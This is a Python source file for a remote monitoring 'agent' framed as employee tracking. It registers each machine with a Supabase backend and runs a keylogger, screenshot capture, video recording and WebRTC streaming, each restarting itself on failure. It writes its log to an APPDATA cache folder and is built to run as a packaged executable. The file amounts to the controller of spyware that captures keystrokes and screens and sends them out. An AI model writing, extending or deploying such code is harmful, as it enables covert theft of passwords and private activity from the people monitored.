import asyncio
import os
import socket
import sys
import traceback
import tkinter as tk
import threading
from dotenv import load_dotenv
from supabase import create_client, Client

# Import services
from services.logger import KeyloggerService
from services.monitor import ScreenshotService
from services.stream import VideoRecorderService
from services.webrtc import WebRTCService

# Determine path to .env when running as exe
if getattr(sys, 'frozen', False):
    application_path = sys._MEIPASS
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

env_path = os.path.join(application_path, '.env')
load_dotenv(env_path)

SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

# Log file for debugging
log_file = os.path.join(os.getenv('APPDATA'), 'AlaskaCache', 'agent.log')
os.makedirs(os.path.dirname(log_file), exist_ok=True)

def log(msg):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{msg}\n")
        print(msg)
    except:
        pass

if not SUPABASE_URL or not SUPABASE_KEY:
    log("Error: Supabase credentials not found in .env")
    sys.exit(1)

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
hostname = socket.gethostname()

try:
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "Unknown"

def show_info_window():
    try:
        root = tk.Tk()
        root.title("Alaska Agent Info")
        root.geometry("450x180")
        root.attributes("-topmost", True)
        
        cache_path = os.path.join(os.getenv('APPDATA'), 'AlaskaCache')
        
        tk.Label(root, text=f"Agent Running: {hostname}", font=("Arial", 12, "bold")).pack(pady=10)
        tk.Label(root, text=f"Cache Path:\n{cache_path}", font=("Arial", 9), fg="blue").pack(pady=5)
        tk.Label(root, text=f"Log File:\n{log_file}", font=("Arial", 8), fg="gray").pack(pady=5)
        tk.Button(root, text="OK (Ocultar)", command=root.destroy).pack(pady=5)
        
        root.mainloop()
    except Exception as e:
        log(f"GUI Error: {e}")

async def run_service(service, name):
    while True:
        try:
            await service.start()
        except Exception as e:
            log(f"[{name}] Crashed: {e}\n{traceback.format_exc()}")
            await asyncio.sleep(5)  # Wait before restart

async def heartbeat(supabase, employee_id):
    while True:
        try:
            supabase.table("employees").update({"last_seen": "now()"}).eq("id", employee_id).execute()
        except Exception as e:
            log(f"Heartbeat failed: {e}")
        await asyncio.sleep(30)

async def main():
    log("=== Agent Starting ===")
    
    # Register/Get Employee
    try:
        response = supabase.table("employees").select("*").eq("hostname", hostname).execute()
        
        if not response.data:
            log("Registering new employee...")
            data = {
                "hostname": hostname,
                "ip_address": ip_address,
                "settings": {"screenshot_interval": 300, "video_duration": 10, "screenshots_enabled": False}
            }
            res = supabase.table("employees").insert(data).execute()
            employee_id = res.data[0]["id"]
        else:
            log("Employee found.")
            employee_id = response.data[0]["id"]
            supabase.table("employees").update({"ip_address": ip_address, "last_seen": "now()"}).eq("id", employee_id).execute()
    except Exception as e:
        log(f"Supabase Init Error: {e}")
        await asyncio.sleep(10)
        return await main()  # Retry

    # GUI Thread
    threading.Thread(target=show_info_window, daemon=True).start()

    # Initialize Services
    logger_service = KeyloggerService(supabase, employee_id)
    monitor_service = ScreenshotService(supabase, employee_id)
    stream_service = VideoRecorderService(supabase, employee_id)
    webrtc_service = WebRTCService(supabase, employee_id)

    log("Starting services...")

    # Run Services with auto-restart
    await asyncio.gather(
        run_service(logger_service, "Keylogger"),
        run_service(monitor_service, "Screenshot"),
        run_service(stream_service, "Video"),
        run_service(webrtc_service, "WebRTC"),
        heartbeat(supabase, employee_id)
    )

if __name__ == "__main__":
    while True:
        try:
            asyncio.run(main())
        except KeyboardInterrupt:
            log("Agent stopped by user.")
            break
        except Exception as e:
            log(f"Main loop crash: {e}\n{traceback.format_exc()}")
            import time
            time.sleep(5)
